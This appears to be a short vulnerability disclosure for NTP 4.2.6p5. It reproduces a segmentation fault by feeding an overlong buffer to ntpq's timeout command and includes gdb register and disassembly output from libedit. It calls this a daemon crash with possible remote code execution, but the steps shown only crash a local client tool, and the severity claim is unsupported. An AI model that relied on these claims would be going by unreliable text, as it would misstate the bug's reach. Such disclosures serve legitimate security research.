# Exploit Title: NTP 4.2.6p5 SegFault, (possible remote code execution)
# Date: 02/10/13
# Exploit Author: Mitchell Hines
# Vendor Homepage: http://ntp.org/
# Software Link: [yum install ntp] [apt-get install ntp]
# Version: 4.2.6p5@1.2349-o
# Tested on: 3.9.10-100.fc17.x86_64
# CVE : undisclosed

This is a crash in the latest NTP service daemon, tested on Fedora 17 x64. I suspect it works on most Linux operating systems. Steps to reproduce:

1) connect to ntp daemon using the ntpq command line tool
2) gdb /usr/sbin/ntpq
3) gdb> r
4) ntpq> timeout [insert large buffer here]
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
  EAX: 0x00000000  EBX: 0x557D7990  ECX: 0xF7128950  EDX: 0x41414141  o d I t s z a p c 
  ESI: 0xFFFFDF6C  EDI: 0x41414141  EBP: 0xFFFFDF6C  ESP: 0xFFFFDF30  EIP:Error while running hook_stop:
Value can't be converted to integer.
0x00007ffff7bc4e11 in el_gets () from /lib64/libedit.so.0
gdb$ disas 0x00007ffff7bc4e11
Dump of assembler code for function el_gets:
   0x00007ffff7bc4e10 <+0>:	push   rbx
=> 0x00007ffff7bc4e11 <+1>:	or     DWORD PTR [rdi+0x2c],0x20
   0x00007ffff7bc4e15 <+5>:	mov    rbx,rdi
   0x00007ffff7bc4e18 <+8>:	call   0x7ffff7bae130 <el_wgets@plt>
   0x00007ffff7bc4e1d <+13>:	and    DWORD PTR [rbx+0x2c],0xffffffdf
   0x00007ffff7bc4e21 <+17>:	lea    rsi,[rbx+0x4a0]
   0x00007ffff7bc4e28 <+24>:	mov    rdi,rax
   0x00007ffff7bc4e2b <+27>:	pop    rbx
   0x00007ffff7bc4e2c <+28>:	jmp    0x7ffff7bad580 <__ct_encode_string@plt>
End of assembler dump.
gdb$ disas  0x7ffff7bae130
Dump of assembler code for function el_wgets@plt:
   0x00007ffff7bae130 <+0>:	jmp    QWORD PTR [rip+0x22969a]        # 0x7ffff7dd77d0
   0x00007ffff7bae136 <+6>:	push   0xfa
   0x00007ffff7bae13b <+11>:	jmp    0x7ffff7bad180
End of assembler dump.
gdb$ 

I will research further to see where the code paths lead to, but for now I am disclosing so everyone can search themselves also if they wish to.

~ Mitch Hines - @__0x57__


